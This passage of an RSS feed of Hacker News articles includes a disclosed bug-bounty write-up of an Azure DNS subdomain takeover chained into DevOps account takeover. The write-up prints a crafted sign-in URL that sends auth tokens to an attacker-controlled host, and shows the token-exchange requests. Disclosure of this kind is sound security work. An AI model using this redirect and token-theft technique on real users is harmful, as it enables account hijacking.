<span>+</span>   <span>const</span> result <span>=</span> <span>callNewService</span><span>(</span>context<span>.</span>param<span>)</span><span>;</span></code></pre></div><p>In this situation, the <code>client</code> had a way to store the result of a previous call to <code>new-service</code> that returned the same value. If <code>result</code> is relatively small and does not change it can be stored with the context and loaded as part of <code>hydrateContext()</code>. That way, the call we can simply avoid <code>callNewService(context.param);</code>.</p><p>The fastest call is the call that never happens 😆</p><p>When you are working on code, don’t <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">optimize prematurely</a>. I recommend, however, you add a “mental checklist” item to focus on latency and cross it off before submitting a PR. That will help you find <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">Donald Knuth’s 3%</a>.</p><p>It is likely that just doing that and focusing on that latency for 10 minutes might point to small but valuable improvements that you can make, and accumulating latency over time.</p><p>Don’t live with latency broken windows!</p></div></div></div></div>]]>
            </description>
            <link>https://yenkel.dev/posts/a-tale-of-latency-and-broken-windows</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700897</guid>
            <pubDate>Wed, 01 Jul 2020 13:08:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Taking over Azure DevOps accounts with one click]]>
            </title>
            <description>
<![CDATA[
Score 90 | Comments 17 (<a href="https://news.ycombinator.com/item?id=23700800">thread link</a>) | @infosecau
<br/>
July 1, 2020 | https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/ | <a href="https://web.archive.org/web/*/https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>When performing subdomain takeovers, you should be asking yourself, what is the impact, and how do I prove it? This was especially the case when taking over the subdomain <code>project-cascade.visualstudio.com</code>.</p>

<p>At first glance, it didn’t seem like we could do much by taking this subdomain over as nothing super sensitive lived under <code>*.visualstudio.com</code>. However, under deeper examination, we were able to exploit a trust boundary, leading to a 1 click account takeover of Azure DevOps accounts.</p>

<h2 id="technical-details">Technical Details</h2>

<p>Through automation, we found the subdomain <code>project-cascade.visualstudio.com</code>, which was vulnerable to an Azure Zone DNS takeover.</p>

<p>The NS records for <code>project-cascade.visualstudio.com</code> were pointing to Azure DNS, however they were no longer registered on Azure DNS. This resulted in the lookups being refused, as shown below:</p>

<pre><code>dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns3-05.azure-dns.org status: [Refused]           
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns2-05.azure-dns.net status: [Refused]
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns1-05.azure-dns.com status: [Refused]          
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns4-05.azure-dns.info status: [Refused]
</code></pre>

<p>As the lookups were being refused, we were able to to register the subdomain under an Azure account that we owned. By doing so, we were able to create arbitrary DNS records for the subdomain <code>project-cascade.visualstudio.com</code>:
<br></p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-0.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Azure Console with <code>project-cascade.visualstudio.com</code> registered as a DNS Zone</em></td>
    </tr>
  </tbody>
</table>

<p><br>
From this point on wards, we registered two records:</p>

<ul>
  <li>TXT Record - <code>txt.project-cascade.visualstudio.com</code> with the value of <code>Azure DNS Zone Takeover POC</code> (proof of concept)</li>
  <li>A Record - <code>arec.project-cascade.visualstudio.com</code> with the value of <code>3.88.203.203</code> (our host)</li>
</ul>

<pre><code>$ dig txt txt.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
txt.project-cascade.visualstudio.com. 10 IN TXT "Azure DNS Zone Takeover POC"

$ dig a arec.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
arec.project-cascade.visualstudio.com. 2475 IN A 3.88.203.203

</code></pre>

<h2 id="so-whats-next">So, what’s next?</h2>

<p>Now that we had successfully taken the subdomain over, it was time to investigate the security impact.</p>

<p>We discovered that there were subdomains underneath <code>visualstudio.com</code> that facilitated an authentication flow through <code>login.microsoftonline.com</code>.</p>

<p>For example, when visiting  <code>app.vssps.visualstudio.com</code>, we were redirected to:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90#ctx=eyJTaWduSW5Db29raWVEb21haW5zIjpbImh0dHBzOi8vbG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSJdfQ2
</code></pre>

<p>Which then redirected to:</p>

<pre><code>https://login.microsoftonline.com/...omitted...
</code></pre>

<p>The most important thing to note from the URLs above, is the following parameter and value for the endpoint <code>https://app.vssps.visualstudio.com/_signin</code>:</p>

<p><code>reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F</code></p>

<p>Through some testing, we determined that this authentication flow had a loosely configured <code>reply_to</code> address, allowing any domain under <code>*.visualstudio.com</code> to recieve the authentication tokens.</p>

<p>In order to demonstrate this account takeover flow, we crafted the following URL:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>In the URL above, note that we changed the value of the <code>reply_to</code> parameter to contain the following: <code>https%3A%2F%2Farec.project-cascade.visualstudio.com%2F</code> (our subdomain takeover).</p>

<p>This will prompt the user to login via the normal microsoft live.com auth flow, or if the user is already logged in, proceed with the signin and redirect request.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-login.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Visual Studio Authentication Flow via <code>login.microsoftonline.com</code></em></td>
    </tr>
  </tbody>
</table>



<p>Once logged in, this resulted in the following request being made which ultimately resulted in a POST request to our controlled domain <code>arec.project-cascade.visualstudio.com</code>.</p>

<pre><code>POST /_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
Host: arec.vssps.visualstudio.com
Cookie: ...omitted for brevity...

id_token=&lt;snip&gt;&amp;FedAuth=&lt;snip&gt;&amp;FedAuth1=&lt;snip&gt;%2B
</code></pre>

<p>Our controlled domain received the following request which contains authentication tokens for <code>app.vsaex.visualstudio.com</code></p>

<pre><code>POST /_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
Host: arec.project-cascade.visualstudio.com
Content-Length: 4634
Referer: https://arec.vssps.visualstudio.com/_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F
Cookie: ...omitted for brevity...

id_token=&lt;snip&gt;&amp;FedAuth=&lt;snip&gt;&amp;FedAuth1=&lt;snip&gt;
</code></pre>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-1.5.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Final Authentication Token received by arec.project-cascade.visualstudio.com (controlled by us)</em></td>
    </tr>
  </tbody>
</table>



<h2 id="what-can-this-token-be-used-for">What can this token be used for?</h2>

<p>We found that we could exchange the stolen authentication token for a Bearer token through <code>app.vsaex.visualstudio.com</code>. This Bearer token could then be used to authenticate to <code>vsaex.visualstudio.com</code>, <code>dev.azure.com</code> and <code>vssps.dev.azure.com</code>.</p>

<pre><code>POST /_apis/WebPlatformAuth/SessionToken HTTP/1.1
Host: app.vsaex.visualstudio.com
Connection: close
Content-Length: 105
Origin: https://app.vsaex.visualstudio.com
X-VSS-ReauthenticationAction: Suppress
Content-Type: application/json
Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
X-Requested-With: XMLHttpRequest
...omitted for brevity...
Cookie: UserAuthentication=&lt;snipped id_token&gt;; FedAuth=&lt;snipped FedAuth&gt;; FedAuth1=&lt;snipped&gt;

{"appId":"00000000-0000-0000-0000-000000000000","force":false,"tokenType":0,"namedTokenId":"Aex.Profile"}
</code></pre>

<p>This request returns the following response with a valid bearer token that can be used elsewhere</p>

<pre><code>HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Length: 933
Content-Type: application/json; charset=utf-8; api-version=6.0-preview.1
...omitted for brevity...

{"appId":"00000000-0000-0000-0000-000000000000","token":"&lt;snip&gt;","tokenType":"session","validTo":"2020-05-12T06:45:47.2007474Z","namedTokenId":"Aex.Profile"}
</code></pre>

<p>e.g. on <code>app.vsaex.visualstudio.com</code> this token can be used to pull the user’s email</p>

<pre><code>GET /_apis/User/User HTTP/1.1
Host: app.vsaex.visualstudio.com
Connection: close
X-TFS-FedAuthRedirect: Suppress
X-VSS-ReauthenticationAction: Suppress
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
Authorization: Bearer &lt;snip just recieved bearer token&gt;
Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
X-TFS-Session: ab1e4b56-599c-4ab6-9f5e-756c486a0f2b
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://app.vsaex.visualstudio.com/me?mkt=en-US
Accept-Encoding: gzip, deflate


HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 258
...omitted for brevity...

{"descriptor":"msa.NTg0Zjc4NDAtYzc5ZC03MWU0LWJkN2ItMDZhY2Y1N2Q2OTA1","displayName":"s","mail":"&lt;account_email&gt;","unconfirmedMail":null,"country":"AU","dateCreated":"2018-05-25T23:19:53.6843383+00:00","lastModified":"2019-01-06T15:43:50.2963651+00:00","revision":0}
</code></pre>

<p>The Bearer token could be used to access <code>https://app.vsaex.visualstudio.com/me?mkt=en-US</code> which we found to disclose project names for the associated user on <code>dev.azure.com</code>.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-1.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Access to <code>app.vsaex.visualstudio.com/me</code> through the stolen token</em></td>
    </tr>
  </tbody>
</table>



<p>Ultimately, this allowed us to use the token on <code>dev.azure.com</code> to access resources:</p>

<pre><code>GET /seanyeoh/_usersSettings/keys?__rt=fps&amp;__ver=2 HTTP/1.1
Host: dev.azure.com
Connection: close
x-tfs-fedauthredirect: Suppress
Origin: https://dev.azure.com
x-vss-reauthenticationaction: Suppress
authorization: Bearer &lt;snip&gt;
accept: application/json;api-version=5.0-preview.1;excludeUrls=true;enumsAsNumbers=true;msDateFormat=true;noArrayWrap=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

</code></pre>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-2.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Accessing resources from dev.azure.com with the generated token</em></td>
    </tr>
  </tbody>
</table>



<p>A malicious attacker could perform a 1 click drive by attack on an unsuspecting user by directing them to a URL such as:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>This would result in their <code>app.vsaex.visualstudio.com</code> tokens being disclosed.</p>

<p>From this point, the the attacker would have full control over the user’s Azure DevOps account.</p>

<p>Additionally, the zone takeover of project-cascade.visualstudio.com could have beeen used to validate ownership over the <code>project-cascade.visualstudio.com</code> domain, setup MX records to capture emails to <code>*.project-cascade.visualstudio.com</code> and prove ownership to create SSL certificates. This may have resulted in various opportunities for fraud and impersonation of Microsoft services.</p>



<p>This attack could be mitigated at two points:</p>
<ol>
  <li>Not having the dangling dns zone <code>project-cascade.visualstudio.com</code></li>
  <li>Restricting the reply_to url for visualstudio tokens on <code>app.vssps.visualstudio.com</code> to the realm for <code>app.vsaex.visualstudio.com</code></li>
</ol>


<ol>
  <li>20th May 2020 - Report filed</li>
  <li>22nd May 2020 - Issue triaged</li>
  <li>22nd May 2020 - $3000 Bounty Awarded</li>
</ol>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-3.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Bount…</em></td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/">https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</a></em></p>]]>
            </description>
            <link>https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700800</guid>
            <pubDate>Wed, 01 Jul 2020 12:56:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Committing Suicide]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 17 (<a href="https://news.ycombinator.com/item?id=23700648">thread link</a>) | @lettergram
<br/>
July 1, 2020 | https://austingwalters.com/on-committing-suicide/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/on-committing-suicide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3389">

<div>
<p>Those that know me, know that I am both bold and resolute. I stand by my thoughts / comments, yet I attempt to keep an open mind, analyze a situation, self-reflect on any biases, and integrate feedback. I even go so far as to analyze my confidence level, see <a href="https://predictionbook.com/" target="_blank" rel="noopener noreferrer">predictionbook.com</a>.</p>
<p>With that in mind. I want to share how utterly angry and helpless I feel —</p>
<p>I can’t share my true thoughts, hell my analysis, of the current political situation in the U.S. Although I have written on it countless times, I end up deleting the posts.</p>
<p>Why?</p>
<p>It’s not safe to share thoughts.</p>
<h2>State of Affairs</h2>
<p>Today, sharing one’s opinion can cost you your livelihood, your ability to communicate, and more.</p>
<p>Historically, that was always true, perhaps more-so. We’re now returning to the status quo — repression.</p>
<p>Today’s flavor of repression is one where offending someone randomly across the globe, can cost you your job. That person may not have a standing in your community and may not have a relationship with your employer. However, they can amplify their voice, tweet your employer, and your employer (scared out of it’s mind by the current situation) will terminate you. That is the state of affairs today. It doesn’t matter if you’re correct or innocent. It doesn’t even matter if 99.9% of people aren’t offended by what you said — we are now in a world of “<a href="https://en.wikipedia.org/wiki/Online_shaming#Cancellation" target="_blank" rel="noopener noreferrer">cancel culture</a>“.</p>
<h2>Finding Middle Ground</h2>
<p>In the United States in 2020, we have two paths. One path leads to an ever more left-leaning populous “uprising”; the other path leads to an ever more right-leaning populous “uprising”. I don’t see an alternative, outside of some quite-frankly comical alternatives (e.g. President Mitt Romney, with VP Bernie Sanders).</p>
<p>One way or another, I lose. No one is speaking up for my beliefs or representing me.</p>
<p>I sense I’m not alone. Everyone I speak to left or right, hates the current state of affairs. Most of us even agree on <em>why</em> we distrust the system. Unfortunately, we can’t elect someone to fix the system. Neither Trump, nor Biden, nor Bernie, nor anyone on the ballot accurately represents or even inspires us.</p>
<p>By and large, I believe this is due to the “absolute” nature of our current social strife. Take the question:</p>
<blockquote><p>Why can’t I be anti-vaccine and pro-choice?</p></blockquote>
<p>You would suspect everyone would agree that we “own” our bodies. If that were true, then you would effectively have to be pro-choice AND support people’s right to choose what to put in their bodies; body ownership is the middle ground. I wish we could coalesce around the middle ground, then compromise on edge cases, enabling progress.</p>
<p>Take another example:</p>
<blockquote><p>Why don’t we do firearms training in schools?</p></blockquote>
<p>It’s an honest question — we’ve had the 2nd amendment for hundreds of years. Similar to driving a car, we should train our youth to handle firearms. I suspect we all know the reason this is not occurring — because a significant portion of the United States is fearful of firearms.</p>
<p>From the evidence, the fear is unjustified. We have evidence that with a good training program and robust mental evaluation process, firearms by-and-large are safe for society. <a href="https://en.wikipedia.org/wiki/Firearms_regulation_in_Switzerland" target="_blank" rel="noopener noreferrer">See Switzerland</a>:</p>
<blockquote><p>Swiss males grow up expecting to undergo basic military training, usually at age 20 in the recruit school..</p>
<p>…Prior to 2007, members of the Swiss Militia were supplied with 50 rounds of ammunition for their military weapon in a sealed ammo box that was regularly audited by the government…</p>
<p>…Every person with a Swiss citizenship, aged 10 years or older, can take part at any federal ranges and will be able to shoot for free with the ordinance rifle…</p>
<p>…In 2016, there were 187 attempted and 45 completed homicides, for a homicide rate of 0.50 per 100,000 population, giving Switzerland one of the lowest homicide rates in the world…</p></blockquote>
<p>Further, firearms are already widely available (<a href="https://en.wikipedia.org/wiki/Estimated_number_of_civilian_guns_per_capita_by_country" target="_blank" rel="noopener noreferrer">300+ million guns in the U.S.</a>) &amp; availability enshrined in law.</p>
<p>Sorrowfully, evidence doesn’t matter here; fear guides many. Yoda has some insights here:</p>
<blockquote><p><span data-parade-type="promoarea" data-parade-location-types="promoarea" data-parade-location-ids="article" data-parade-views="false" data-parade-touches="false" data-parade-clicks="false" data-parade-mouseovers="false">Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.</span></p>
<p>— George Lucas (Yoda)</p></blockquote>
<h2>The False Dichotomy</h2>
<p>I don’t agree with the left or the right on many things in United States politics. In fact, I find most of the arguments a false dichotomy, designed to garner votes. To share one’s full thoughts would cause either or both sides to lash out, even though evidence may support the claims / musings.</p>
<p>Regretfully, this leaves me and many others out of the public discourse. While most of us have heard,</p>
<blockquote><p>The only thing necessary for the triumph of evil is for good men to do nothing.</p>
<p>— Edmund Burke (attributed)</p></blockquote>
<p>It’s not quite that simple and I prefer another sentiment:</p>
<blockquote><p>A man dies when he refuses to stand up for that which is right. A man dies when he refuses to stand up for justice. A man dies when he refuses to take a stand for that which is true.</p>
<p>— Martin Luther King Jr.</p></blockquote>
<center><br>
<iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/0On19DRA2fU?start=88" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"><span style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;" data-mce-type="bookmark" class="lazy lazy-hidden mce_SELRES_start">﻿</span></iframe></center><p>Truthfully, we’re all being held hostage. I am very confident few people fully agree with either side in this political theater. We have extremists on either side shouting and being amplified by social media. In truth, the vast majority of us don’t agree [fully] with either extreme. Most of us, want to “live and let live” — that’s the American way. We’re a country founded on our hatred for taxes and the desire to live free from persecution. Please, please.. Don’t let that change.</p>
<p>It’s easy to decide “what’s right” when you look at it through that lens — am I persecuting others or increasing taxes (arguably a form of persecution)? If either are true, likely we should reconsider our stance.</p>
<h2>The Chaos</h2>
<p>Today, we are edging towards chaos. We all feel it. Riots, job loss, deadly diseases, [trade] wars, homelessness… We need leadership that can unite us.</p>
<p>Unfortunately, many of our would-be leaders have opted out or have been pushed out of this system. They’ve become engineers, scientists, bloggers — too scared to share their opinions (<a href="https://en.wikipedia.org/wiki/Slate_Star_Codex" target="_blank" rel="noopener noreferrer">even shutting down</a>). To hold a nuanced opinion different from the “socially accepted” by one group or another will get you “canceled”. In this case, “canceled” can mean anything from losing your job, to losing financial platforms/instruments (i.e. PayPal, VISA, YouTube revenue, etc.), to receiving threats on your life.</p>
<p>We have an ongoing pandemic, with millions in the United States likely about to perish, the economy collapsing, and we still cannot escape the politics.</p>
<p>I’m not hopeful.</p>
<p>I have so many musings, stories, and analyses I’d like to share, but neither facts nor my opinions matter.</p>
<p>Let’s be honest —</p>
<ul>
<li>I’m a white, cisgender, straight, male</li>
<li>I work as a technical manager in a research group, at a bank</li>
<li>I’m socially liberal in many ways and conservative in others</li>
<li>I grew up lower-middle class; now, I’m upper-middle class</li>
<li>I don’t attribute myself to any political party</li>
</ul>
<p>A large number of people dismiss or overlook me because of my background. Those who don’t outright dismiss me are also not likely to support my interest(s).</p>
<h2>Meritocracy or Bust</h2>
<p>What scares me is that I am a father and I am fearful for my children’s future. I was raised with the understanding that America is a meritocracy. Regardless of your race, gender, or creed, you should have the ability to make a life in the United States,<strong><em> to build a future for your children</em></strong>. Sadly, I don’t see the same core mission today. None of the political parties or the government at large appears forward-looking, for the children. Perhaps, that’s because of a <a href="https://www.cdc.gov/nchs/nvss/births.htm" target="_blank" rel="noopener noreferrer">declining birthrate</a>, I’m not sure.</p>
<p>As someone with children, I’m pleading for a group to come together to challenge the current status quo and equitably look to improve our society. We do have systemic problems that need to be fixed. Compromises will need to be made, but I don’t believe we need sacrifices from anyone.</p>
<p>The racism and sexism needs to stop. I suspect, most of us (though, not all) want a meritocracy, a hierarchy based on merit. Unfortunately, what’s being propagated is a hierarchy based on race, sex and orientation — the under-privileged. It’s clear from the countless stories we see in the news. I am sure you are tired of the racism, as am I. That’s probably true regardless of which side of the political spectrum you fall.</p>
<p><em>No one’s</em> value to society should be assessed by their race, gender or creed. A person’s value should be based off what they have to offer to a given group, organization, or society. We can rally around that idea (that we’re all equal, differentiated on merit) and work to improve. It’s a middle ground we can [mostly] agree on. From there, we can fix the injustices.</p>
<p>What horrifies me, is that even to express that <em>“we’re all equal” </em>is a challenge to this new socio-economic hierarchy. <em>No one</em> is representing me or has my family’s best interests in mind. Realistically, I don’t expect anyone to have <em>my family’s interests</em> in mind, but I don’t want my potential / rights eroded.</p>
<p>Due to this political tug of war, both sides of the political spectrum want to diminish our rights; they’re only bickering over which rights to diminish. Let’s stop this tug of war and come together.</p>
<p>If we don’t come together, soon enough we won’t have a democracy, or frankly, a future to build for.</p>
<h2>In the Words of John Adams…</h2>
<blockquote><p>Remember, democracy never lasts long. It soon wastes, exhausts, and murders itself. There never was a democracy yet that did not commit suicide. It is in vain to say that democracy is less vain, less proud, less selfish, less ambitious, or less avaricious than aristocracy or monarchy. It is not true, in fact, and nowhere appears in history. Those passions are the same in all men, under all forms of simple government, and when unchecked, produce the same effects of fraud, violence, and cruelty. When clear prospects are opened before vanity, pride, avarice, or ambition, for their easy gratification, it is hard for the most considerate philosophers and the most conscientious moralists to resist the temptation. Individuals have conquered themselves. Nations and large bodies of men, never.</p>
<p>—…</p></blockquote></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://austingwalters.com/on-committing-suicide/">https://austingwalters.com/on-committing-suicide/</a></em></p>]]>
            </description>
            <link>https://austingwalters.com/on-committing-suicide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700648</guid>
            <pubDate>Wed, 01 Jul 2020 12:34:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beyond surveillance capitalism: alternatives, stopgaps, Small Web, and Site.js]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23700589">thread link</a>) | @syck
<br/>
July 1, 2020 | https://small-tech.org/videos/creative-mornings-istanbul/ | <a href="https://web.archive.org/web/*/https://small-tech.org/videos/creative-mornings-istanbul/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
	
	<p><iframe src="https://player.vimeo.com/video/433950462" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p>
<h2 id="details">Details</h2>
<p>This is the talk on moving beyond surveillance capitalism with alternatives, stopgaps, and the Small Web that Aral gave at <a href="https://creativemornings.com/talks/aral-balkan">Creative Mornings Istanbul</a> on 26 June, 2020.</p>
<p>The recording of the live stream has been edited to:</p>
<ul>
<li>
<p>Fix the 3-frame audio/video sync (live and learn: all HDMI output has a delay and if you are bringing in your microphone separately, you need to delay it while streaming/recording it).</p>
</li>
<li>
<p>Reduce audio levels (like a rookie, I didn’t check my levels before starting the live stream so the audio is clipped. Can’t fix that but I lowered the audio track so at least now it’s not booming in your ears.)</p>
</li>
<li>
<p>Cut out a part of my bumbling conclusion where I forgot the switcher on my screen instead of switching to my camera and then did a second awkward conclusion to camera when I realised.</p>
</li>
</ul>
<p>We’ve also added closed captions (made using thisten.co), chapters (so you can skim/jump to relevant sections), and links to the tools mentioned in the talk.</p>
<p>All in all, not terrible for a first live stream with our new live stream setup.</p>
<p>Music credit: Kevin MacLeod, FreePD.com (Creative Commons 0).</p>

</div></div>]]>
            </description>
            <link>https://small-tech.org/videos/creative-mornings-istanbul/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700589</guid>
            <pubDate>Wed, 01 Jul 2020 12:24:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Facebook is making a big investment in India?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23700566">thread link</a>) | @karimaliz
<br/>
July 1, 2020 | https://thezentech.co/2020/06/29/facebook-and-amazon-all-roads-lead-to-india/ | <a href="https://web.archive.org/web/*/https://thezentech.co/2020/06/29/facebook-and-amazon-all-roads-lead-to-india/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<p>In the&nbsp;<a target="_blank" href="https://thezentech.co/2020/05/25/are-online-ads-a-bubble-seriously/" rel="noreferrer noopener">previous essay</a>, I talked about that Facebook’s primary revenue source is from online ads.</p>



<blockquote><p>Well, there is no easy way to say that, but 98% of Facebook revenue is coming from online ads. So it’s not a big surprise that they are one of the most affected companies by both surges of usage as people are using Facebook, Instagram, Whatsapp more heavily, and decrease of marketing spend on ads on its platform. So ads for Facebook are basically a matter of existence.</p></blockquote>



<p>So It is smart – or a strategic necessity as I will explain in a minute – that they are trying to find different revenue streams.</p>



<p>In the last Facebook’s earnings call, Mark Zuckerberg said:</p>



<blockquote><p>I have always believed that in times of economic downturn, the right thing to do is to keep investing in building the future, and I believe this for a few reasons. First, when the world changes quickly, people have new needs and that means that there are more new segments to build. Second, since many big companies will pull back on their investments, there are a lot of things that wouldn’t otherwise get built, but that we can help deliver.[..] we’re planning to hire at least 10,000 more people in product and engineering roles this year, so we can continue building and making progress.</p><cite>Mark Zuckerberg – Facebook earnings call 2020 Q1</cite></blockquote>



<p>Afterward, Facebook invested $5.7 billion for a 9.99% stake in India’s Reliance Jio Platforms as the largest single investment in Facebook’s history.</p>



<p>Jio Platforms is connecting more than 388 million people in India to the internet. And if we look at the following chart. The number of internet India is so high in comparison with the US and EU.</p>



<div><figure><img data-attachment-id="562" data-permalink="https://thezentech.co/2020/06/29/facebook-and-amazon-all-roads-lead-to-india/924f6cad-49ee-493f-b9f8-5592298695cf/" data-orig-file="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?fit=1360%2C874&amp;ssl=1" data-orig-size="1360,874" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="924F6CAD-49EE-493F-B9F8-5592298695CF" data-image-description="" data-medium-file="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?fit=300%2C193&amp;ssl=1" data-large-file="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?fit=1024%2C658&amp;ssl=1" src="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?fit=1024%2C658&amp;ssl=1" alt="" width="768" height="494" srcset="https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?w=1360&amp;ssl=1 1360w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?resize=300%2C193&amp;ssl=1 300w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?resize=1024%2C658&amp;ssl=1 1024w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?resize=768%2C494&amp;ssl=1 768w, https://i0.wp.com/thezentech.co/wp-content/uploads/2020/06/924F6CAD-49EE-493F-B9F8-5592298695CF.jpeg?resize=1200%2C771&amp;ssl=1 1200w" sizes="(max-width: 768px) 100vw, 768px" 